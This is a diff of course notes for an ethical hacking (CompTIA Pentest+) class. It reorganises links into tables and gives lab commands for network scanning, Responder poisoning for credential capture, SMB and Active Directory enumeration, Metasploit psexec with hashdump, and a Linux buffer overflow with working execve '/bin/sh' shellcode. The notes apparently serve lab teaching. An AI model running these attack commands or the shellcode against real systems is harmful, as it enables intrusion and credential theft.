@@ -1,280 +1,270 @@
-# CYBERSEC 590 – Master Program  
-**Ethical Hacking in CyberSecurity Operations**  
-CompTIA Pentest+  
+# CYBERSEC 590 – Master Program Notes
+## Ethical Hacking in CyberSecurity Operations (CompTIA Pentest+)
 
-⚠️ **Do not hack computer systems you are not authorized to use or use them in ways that are not authorized**  
-
-Professor: *Ryan Linn*  
+**Professor:** *Ryan Linn*
 
 ---
 
-##  Useful Links
-
-1. [Metasploit Console Commands – OffSec](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/)  
-2. [Comprehensive Guide on Dirb Tool – HackingArticles](https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/)  
-3. [Nikto Cheat Sheet – HighOn.Coffee](https://highon.coffee/blog/nikto-cheat-sheet/)  
-4. [Kali Linux](https://www.kali.org/)  
-5. [Ettercap Project](https://www.ettercap-project.org/about.html)  
-6. [Windows CMD Commands Cheat Sheet – Serverspace](https://serverspace.io/support/help/windows-cmd-commands-cheat-sheet/)  
-7. [Linux Commands Cheat Sheet – LinuxTrainingAcademy](https://www.linuxtrainingacademy.com/linux-commands-cheat-sheet/)  
-8. [DNS Hijacking](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/dns-hijacking/)
-9. [Reponder Sniffer](https://www.kali.org/tools/responder/)
-10. [Burp - Intercept HTTP traffic](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)
-11. [Windows Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
-12. [Windows Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer)
-13. [Enum4Linux](https://www.kali.org/tools/enum4linux/)
-14. [SMBMap](https://www.kali.org/tools/smbmap/)
-15. [Wmic](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)
-16. [Mimikatz](https://www.varonis.com/blog/what-is-mimikatz)
-17. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
-18. https://github.com/GhostPack/SafetyKatz
-19. [Lolbas Living Off The Land Binaries ](https://lolbas-project.github.io/)
-20. [Windows privilege escalation](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
-21. [Linux Privilege Escalation](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) 
-22. [WMI](https://attack.mitre.org/techniques/T1047/)
-23. https://github.com/GhostPack/Seatbelt
-24. https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
-25. https://dev.to/saravana_gautham_g/abusing-lolbins-rundll32exe-lab-sysmon-detection-170h
-26. https://github.com/aniqfakhrul/powerview.py
-27. https://github.com/tevora-threat/SharpView
-28. https://github.com/GhostPack/Rubeus
-29. https://github.com/GhostPack/SharpUp
-30. https://owasp.org/
-31. https://www.sans.org/tools
-32. https://github.com/fortra/impacket
-33. https://powersploit.readthedocs.io/en/latest/
-34. https://attack.mitre.org/
-35. https://github.com/redcanaryco/atomic-red-team
-36. https://en.wikipedia.org/wiki/List_of_file_signatures
-37. https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
----
-
-##  Tasks  
-
-### 🔍 nmap  
-
-**Goal:** Map the network, identify active hosts, open ports, and potential vulnerabilities.  
-
-1. Find your machine’s IP address:  
-   ```bash
-   ip a
-   ```
-
-2. Scan your network:  
-   ```bash
-   nmap <Kali_IP_Address/segment_class>
-   ```
-   → *Question:* How many machines were found with open ports?  
-
-3. Scan the main server:  
-   ```bash
-   sudo nmap -sS -sV -A <Machine_IP>
-   ```
-   → *Question:* What is the type and version of SSH used?  
-
-4. Check SSH authentication methods:  
-   ```bash
-   sudo nmap -sS -sV -A <Any_linux_machine_name> --script ssh-auth-methods
-   ```
-   → *Question:* Which authentication methods are allowed?  
-
-5. Check for Slowloris vulnerability:  
-   ```bash
-   nmap <linux_webserver_machine> --script http-slowloris-check
-   ```
-   → *Question:* What is the vulnerability CVE?  
+⚠️ **Do not hack computer systems you are not authorized to use or use them in ways that are not authorized**
 
 ---
 
-### 📂 Dirb  
+## I. Foundational Resources & General Tools
 
-**Goal:** Enumerate hidden pages and directories in websites.  
-
-- Search for specific extensions:  
-  ```bash
-  dirb url -X php
-  ```
-
-- Basic scan:  
-  ```bash
-  dirb http://exploit.local
-  ```
-  → *Default wordlist used:*  
-  `/usr/share/dirb/wordlists/common.txt`  
-
-- Scan with vulnerability wordlist:  
-  ```bash
-  dirb http://techportal.local /usr/share/dirb/wordlists/vulns/cgis.txt
-  ```
-
-- Ignore HTTP 400 errors:  
-  ```bash
-  dirb url -N 400
-  ```
-
-- Ignore errors and search for `.php` pages:  
-  ```bash
-  dirb url -N 400 -X php
-  ```
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 4 | Kali Linux Official Website | Penetration testing distribution. | [kali.org](https://www.kali.org/) |
+| 6 | Windows CMD Commands Cheat Sheet | Reference for Windows Command Prompt commands. | [serverspace.io](https://serverspace.io/support/help/windows-cmd-commands-cheat-sheet/) |
+| 7 | Linux Commands Cheat Sheet | Reference for common Linux terminal commands. | [linuxtrainingacademy.com](https://www.linuxtrainingacademy.com/linux-commands-cheat-sheet/) |
+| 30 | OWASP - Open Web Application Security Project | Community-driven efforts for web application security. | [owasp.org](https://owasp.org/) |
+| 31 | SANS Institute Tools | Security tools and resources from SANS. | [sans.org/tools](https://www.sans.org/tools) |
+| 34 | MITRE ATT&CK Framework | Globally accessible knowledge base of adversary tactics and techniques. | [attack.mitre.org](https://attack.mitre.org/) |
+| 35 | Atomic Red Team | Small, highly portable detection tests mapped to the MITRE ATT&CK framework. | [Atomic-Red-Team](https://github.com/redcanaryco/atomic-red-team) |
+| 36 | List of File Signatures (Magic Numbers) | Information on file signatures for file type identification. | [wikipedia.org](https://en.wikipedia.org/wiki/List_of_file_signatures) |
+| 38 | CyberChef | The Cyber Swiss Army Knife - web app for data analysis and conversion. | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef/) |
 
 ---
 
-### 🌐 Nikto  
+## II. Information Gathering & Network Scanning
 
-**Goal:** Scan web servers and identify known vulnerabilities.  
+### 🔍 Nmap (Network Mapper) Tasks
+**Goal:** Map the network, identify active hosts, open ports, and potential vulnerabilities.
 
-1. Quick help:  
-   ```bash
-   nikto -H
-   ```
+1.  Find your machine’s IP address:
+    ```bash
+    ip a
+    ```
+2.  Scan your network:
+    ```bash
+    nmap <Kali_IP_Address/segment_class>
+    ```
+3.  Scan the main server (Stealth, Version detection, Aggressive):
+    ```bash
+    sudo nmap -sS -sV -A <Machine_IP>
+    ```
+4.  Check SSH authentication methods:
+    ```bash
+    sudo nmap -sS -sV -A <Any_linux_machine_name> --script ssh-auth-methods
+    ```
+5.  Check for Slowloris vulnerability:
+    ```bash
+    nmap <linux_webserver_machine> --script http-slowloris-check
+    ```
 
-2. Main flags:  
-   - Set target: `-url` or `-host`  
-   - Exclude tests: `-Tuning`  
+### Web Content Enumeration (Dirb & Nikto)
 
-3. Basic scan:  
-   ```bash
-   nikto -url website_name
-   ```
-   → *Question:* Which software is outdated?  
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 2 | Comprehensive Guide on Dirb Tool | Tutorial for the web content scanner. | [hackingarticles.in](https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/) |
+| 3 | Nikto Cheat Sheet | Quick reference for the web server scanner. | [highon.coffee](https://highon.coffee/blog/nikto-cheat-sheet/) |
 
-4. Scan multiple hosts (from a file) and specific ports:  
-   ```bash
-   nikto -h /home/cyberuser/hostlist.txt -p 8080,443
-   ```
+#### 📂 Dirb Tasks
+**Goal:** Enumerate hidden pages and directories in websites.
+
+-   Search for specific extensions:
+    ```bash
+    dirb url -X php
+    ```
+-   Basic scan (uses `/usr/share/dirb/wordlists/common.txt` by default):
+    ```bash
+    dirb [http://exploit.local](http://exploit.local)
+    ```
+-   Scan with vulnerability wordlist:
+    ```bash
+    dirb [http://techportal.local](http://techportal.local) /usr/share/dirb/wordlists/vulns/cgis.txt
+    ```
+-   Ignore HTTP 400 errors and search for `.php` pages:
+    ```bash
+    dirb url -N 400 -X php
+    ```
+
+#### 🌐 Nikto Tasks
+**Goal:** Scan web servers and identify known vulnerabilities.
+
+1.  Quick help: `nikto -H`
+2.  Main flags: `-url` or `-host` (Set target), `-Tuning` (Exclude tests)
+3.  Basic scan: `nikto -url website_name`
+4.  Scan multiple hosts (from a file) and specific ports:
+    ```bash
+    nikto -h /home/cyberuser/hostlist.txt -p 8080,443
+    ```
+
 ---
 
-### Metasploit 
+## III. Protocol & Traffic Analysis (Sniffing, Man-in-the-Middle)
 
-msfconsole
-use auxiliary/scanner/smb/smb_version
-show targets
-show payloads
-show options
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 5 | Ettercap Project Information | Suite for Man-In-The-Middle attacks. | [ettercap-project.org](https://www.ettercap-project.org/about.html) |
+| 8 | DNS Hijacking Explanation | Overview of the DNS redirection attack technique. | [sentinelone.com](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/dns-hijacking/) |
+| 9 | Responder Sniffer Tool Documentation | Tool for LLMNR, NBT-NS and mDNS poisoning. | [kali.org/tools](https://www.kali.org/tools/responder/) |
 
-meterpreter 
+### Wireshark (Traffic Analysis) Filters
+-   Filter for specific IPv4 address: `ip.addr == 192.168.66.20`
+-   Filter for destination port 53 (TCP or UDP): `tcp.dstport == 53` and `udp.dstport == 53`
+-   Filter for source IP excluding ICMP: `ip.addr==192.168.200.1 and !icmp`
+-   Filter for TCP packets with SYN flag set: `tcp.flags.syn == 1`
+-   Filter for email traffic $\le$ 128 bytes: `frame.len <= 128 and (smtp or pop or imap)`
+-   Locating DNS response by transaction ID (Example): `dns.id==0x7831`
+
+### Reponder (Poisoning & Credential Capture)
+-   Fingerprint network systems:
+    ```bash
+    sudo python /usr/share/responder/tools/RunFinger.py -i 10.233.20.0/23
+    ```
+-   Help menu: `sudo python /usr/share/responder/Responder.py -h`
+-   Option to prevent active mode: `-A`
+-   Run in active mode (wfrP - Web, File, SMB, POP3/IMAP/SMTP/FTP, NTLMv1/v2):
+    ```bash
+    sudo python /usr/share/responder/Responder.py -wfrP -I eth0
+    ```
+
+---
+
+## IV. Exploitation Frameworks & Web Exploitation
+
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 1 | Metasploit Console Commands – OffSec | Reference for the Metasploit Framework command line. | [offsec.com](https://www.offsec.com/metasploit-unleashed/msfconsole-commands/) |
+| 10 | Burp Suite - Intercept HTTP traffic | Documentation on using the Burp proxy for HTTP/S traffic interception. | [portswigger.net](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic) |
+| 32 | Impacket GitHub Repository | Python classes for working with network protocols (e.g., SMB, MSRPC). | [fortra/impacket](https://github.com/fortra/impacket) |
+| 33 | PowerSploit Documentation | PowerShell modules for penetration testing. | [powersploit.readthedocs.io](https://powersploit.readthedocs.io/en/latest/) |
+
+### Metasploit Commands
+-   `msfconsole`
+-   `use auxiliary/scanner/smb/smb_version`
+-   `show targets`
+-   `show payloads`
+-   `show options`
+-   `meterpreter` (Post-exploitation shell)
+
+---
+
+## V. Windows/SMB & Active Directory Enumeration & Exploitation
+
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 13 | Enum4Linux Tool Documentation | Tool for enumerating data from Windows and Samba. | [kali.org/tools](https://www.kali.org/tools/enum4linux/) |
+| 14 | SMBMap Tool Documentation | Utility to list SMB share contents. | [kali.org/tools](https://www.kali.org/tools/smbmap/) |
+| 15 | WMIC (Windows Management Instrumentation Command-line) | Microsoft documentation for the WMI CLI. | [microsoft.com](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) |
+| 16 | Mimikatz Explained | Overview of the tool for extracting credentials from memory. | [varonis.com](https://www.varonis.com/blog/what-is-mimikatz) |
+| 17 | CrackMapExec GitHub | Swiss Army knife for pentesting large Active Directory environments. | [byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) |
+| 18 | SafetyKatz GitHub | Defensive fork of Mimikatz. | [GhostPack/SafetyKatz](https://github.com/GhostPack/SafetyKatz) |
+| 26 | PowerView.py GitHub | Python implementation of PowerView for Active Directory enumeration. | [aniqfakhrul/powerview.py](https://github.com/aniqfakhrul/powerview.py) |
+| 27 | SharpView GitHub | C\# implementation of PowerView. | [tevora-threat/SharpView](https://github.com/tevora-threat/SharpView) |
+| 28 | Rubeus GitHub | C\# toolset for raw Kerberos interaction and abuse. | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
+
+### Windows Enumeration & Reconnaissance
+
+-   Identify IP/Network segment: `ip a`
+-   Scan for Windows servers (ports 445, 389):
+    ```bash
+    nmap --open -p445,389 <attacker_machine_IP/segment_class>
+    ```
+-   Check SMB signing status:
+    ```bash
+    nmap --open -p445 <attacker_machine_IP/segment_class> --script smb2-security-mode
+    ```
+
+### Enum4Linux Tasks (Domain Enumeration)
+-   Enumerate user accounts (`-U`):
+    ```bash
+    enum4linux -u <username> -p <password> -U <domainController>
+    ```
+-   Enumerate group members (`-G`):
+    ```bash
+    enum4linux -u <username> -p <password> -G <domainController> | grep "Domain Admins"
+    ```
+-   View password policy (`-P`):
+    ```bash
+    enum4linux -u <username> -p <password> -P <domainController>
+    ```
+
+### SMBMap & SMBClient Tasks
+-   List SMB shares with permissions:
+    ```bash
+    smbmap -H <domainController> -u <username> -p <password>
+    ```
+-   Access shared folder and download file:
+    ```bash
+    smbclient //<domainController>/<shared_folder> -U <username> '<password>'
+    # dir, get <file_name>, exit, cat <file_name>
+    ```
+
+### Post-Exploitation on Windows
+-   **Metasploit Psexec:**
+    ```bash
+    use exploit/windows/smb/psexec
+    set rhosts <fs-xxxxx_name_or_IP_address>
+    set smbuser <username>
+    set smbpass <password>
+    set smbdomain stark
+    exploit
+    shell
+    ```
+-   **WMI (Windows Management Instrumentation):**
+    -   Installed software: `wmic product get name,installdate`
+    -   Installed updates: `wmic qfe get Caption, Description, HotFixID, InstalledOn`
+-   **Local System Info (Meterpreter/Shell):**
+    -   `sysinfo`, `getuid`, `getsystem`, `hashdump` (and CrackMapExec)
+    -   Check privileges: `whoami /priv`
+-   **Lateral Movement/Tunneling:** `psexec`, `RDP Tunneling`, `netsh interface portproxy`
+
+---
+
+## VI. Privilege Escalation & Persistence
+
+| Link # | Title | Description | Link |
+| :--- | :--- | :--- | :--- |
+| 11 | Windows Autoruns Utility | Tool to view and manage programs configured to run at system startup. | [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) |
+| 12 | Windows Process Explorer | Advanced task manager utility. | [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) |
+| 19 | LOLBAS - Living Off The Land Binaries | Project documenting native Windows binaries that can be used for malicious purposes. | [lolbas-project.github.io](https://lolbas-project.github.io/) |
+| 20 | WinPEAS - Windows Privilege Escalation | Tool to check for Windows privilege escalation vectors. | [peass-ng/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) |
+| 21 | LinPEAS - Linux Privilege Escalation | Tool to check for Linux privilege escalation vectors. | [peass-ng/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) |
+| 22 | MITRE ATT&CK: WMI (T1047) | Details on using WMI for execution. | [attack.mitre.org](https://attack.mitre.org/techniques/T1047/) |
+| 29 | SharpUp GitHub | C\# tool for privilege escalation checks on Windows. | [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp) |
+
+### Buffer Overflow (Linux Example)
+
+-   Debugging: `gdb --args ./progrm`
+-   Pattern creation: `msf-pattern-create 2040`
+-   Buffer with Overwrite (EIP/EBP): `perl -e 'print "a"x1036 . "BBB"`
+
+#### Linux Shellcode Example (Execve '/bin/sh')
+
+```c
+xor   %eax,%eax
+push  %eax
+push  $0x68732f2f
+push  $0x6e69622f
+mov   %esp,%ebx
+push  %eax
+push  %ebx
+mov   %esp,%ecx
+mov   $0xb,%al
+int   $0x80
+
+#include <stdio.h>
+#include <string.h>
  
+char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
+		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
----
+int main(void)
+{
+    fprintf(stdout,"Length: %d\n",strlen(shellcode));
+    (*(void(*)()) shellcode)();
+    return 0;
+}
+```
 
-### Wireshark
+Here is section VII. Detection & Defense Evasion exported in Markdown format:
 
-Create a filter that captures all traffic associated with IPv4 address 192.168.66.20. 
-ip.addr == 192.168.66.20
-
-How many packets use port 53 as a destination port? Consider both TCP and UDP packets.
-tcp.dstport == 53
-udp.dstport == 53
-
-What is the correct syntax for running a query that displays all packets using a source IP of 192.168.200.1, excluding ICMP packets?
-ip.addr==192.168.200.1 and !icmp
-
- filter that displays all TCP packets with an SYN flag set to 1
- tcp.flags.syn == 1
-
- Which of the following filtering queries should be used for viewing email traffic, smaller or equal to 128 bytes per packet?
- 
-frame.len <= 128 and (smtp or pop or imap)
-
-What is the number of the first DNS Response packet associated with the DNS Request packet marked by number 414?
-
-Each packet in a transport stream is identified by a 13-bit packet identifier (PID).
-To find the packet ID value, locate the DNS request packet by its frame number (No. value) of 414.
-Using the id value shown in the initiated request (id=0x7831), look for the corresponding DNS response packet.
-
-To locate the response packet using the display filter, filter by the associated transaction id- 'dns.id==0x7831'.
-This filter will show all packets associated with this id value (queries and response packets).
-Viewing these results, look for the first response packet frame number (No. value).
-
-### Reponder
-
-By scanning the systems in the network, it is possible to receive helpful information regarding potential targets, such as SMB signing not required, which allows an attacker to perform a man-in-the-middle attack by relaying captured credentials from one system to another.
-
-Run the sudo python `/usr/share/responder/tools/RunFinger.py -i 10.233.20.0/23` command.
-
-Responder can be used in active or passive mode.
-
-Active mode means actively manipulating the data. It could "break" the network by responding to requests and broadcasts, which could resolve authentication popups to network users that eventually could raise an alarm.
-
-Passive mode is monitoring and analyzing the network traffic, capturing the relevant data and relaying it to other systems, attempting to crack password hashes, or using clear text passwords.
-
-Run the sudo `python /usr/share/responder/Responder.py -h`  command.
-
-Which option prevents the responder from running in active mode?
-
-`-A`
-
-Like other sniffing tools, responder constantly sniffing the network requests and broadcasts. In this question you will use the responder in active mode.
-
-Run responder using the `sudo python /usr/share/responder/Responder.py -wfrP -I eth0`
-
-##### windows
-
-The first enumeration stage is to scan the network and identify the Windows systems in your environment. 
-Run the ip a command to identify your IP address and network segment.
-Using ports 445 and 389 can assist in identifying the Windows servers.
-Next, run the nmap --open -p445,389 <attacker_machine_IP/segment_class> command.
-
-SMB signing is a security mechanism in Windows that ensures the authenticity and integrity of communications between clients and servers using the Server Message Block protocol. When SMB signing is not "enabled and required", it can be exploited.
-This question will give you more information about the Windows machine SMB signing status using nmap scripts.
-Run the nmap --open -p445 <attacker_machine_IP/segment_class> --script smb2-security-mode command.
-Attackers can exploit SMB signing vulnerabilities to launch man-in-the-middle attacks and gain unauthorized access to data transmitted over SMB connections, allowing them to execute malicious code and steal sensitive information.
-
-At the beginning of the lab, you performed a network scan and identified a domain controller (the machine that uses port 389 is the most probable machine, checking for other available ports will confirm it).
-Identifying user accounts is valuable when searching for information during an attack; it can be used for information gathering, login attempts, impersonation, and manipulation.
-The "-U" option will provide information on the user accounts.
-Run the enum4linux -u <username> -p <password> -U <domainController> command. and review the output.
-
-
-Identifying the users with high privileges will enable attackers to focus on them to achieve a system takeover. 
-Using the "-G" option will provide information on group members.
-Run the enum4linux -u <username> -p <password> -G <domainController> | grep "Domain Admins" command.
-
-The Windows password policy can contain various settings and requirements, such as minimum password length, complexity requirements, password expiration, password history, account lockout thresholds, and more. These settings are designed to help protect against common password-based attacks and ensure the security of user accounts and data.
-Using the "-P" option will provide information on the domain's password policy.
-Run the enum4linux -u <username> -p <password> -P <domainController> command.
-
-
-
-Metasploit is a powerful tool to scan, enumerate, and exploit systems.
-Run the msfconsole command to start the Metasploit framework.
-Next, select the module by using the `use exploit/windows/smb/psexec` command.
-Configure the module with the following parameters:
-`set rhosts <fs-xxxxx_name_or_IP_address>
-set smbuser <username>
-set smbpass <password>
-set smbdomain stark
-exploit`
-Next, run the `shell` command in the "Meterpreter" command line.
-Now, run the `wmic product get name,installdate` command to get the installed software.
-
-
-Security updates for Windows are crucial for securing the operating system.
-Missing security updates could indicate that the server is vulnerable and could be compromised.
-While still in the shell session you created in the previous question, examine the installed updates by running the `wmic qfe get Caption, Description, HotFixID, InstalledOn` command.
-The "get" option lets you select which columns will be presented.
-
-Smbmap is a command-line tool used to enumerate and discover open SMB (Server Message Block) shares on Windows and Linux systems.
-Open an additional terminal tab and run the smbmap -H <domainController> -u <username> -p password>  command.
-Which folder has Read/Write permissions?
-
-Smbclient is a command-line tool to access and manage files, printers, and other resources on a remote SMB/CIFS (Server Message Block/Common Internet File System) server.
-To create an smb shell on the server, run the smbclient //<domainController>/<shared_folder> -U <username> '<password>' command.
-Next, use the dir command to view the file list and run the get <file_name> command to download it to the Kali machine.
-Now, run the exit command to return to the Kali, and next run the cat <file_name> to view its content.
-What is the password in the file?
-
-Windows
-sysinfo
-getuid
-getsystem
-hashdump (and CrackMapExec)
-
-whoami /priv
-
-
-Linux
-psexec
-RDP Tunneling
-netsh interface portproxy
+VII. Detection & Defense Evasion
+|	Title	| Description |	Link |
+| :---  | :--- | :--- |
+|Seatbelt GitHub	 | C# host enumeration tool to identify configurations that may be used by adversaries. |	[GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+| Sysmon Documentation |	System Monitor service for detailed logging of system activity.	| [microsoft.com](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
+| Abusing LOLBINs rundll32.exe Lab | Sysmon Detection	Article on detecting Living Off The Land Binaries abuse with Sysmon. |	[dev.to](https://dev.to/saravana_gautham_g/abusing-lolbins-rundll32exe-lab-sysmon-detection-170h)
+| Sysmon Documentation |	System Monitor service for detailed logging of system activity.	 | [microsoft.com ](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
 
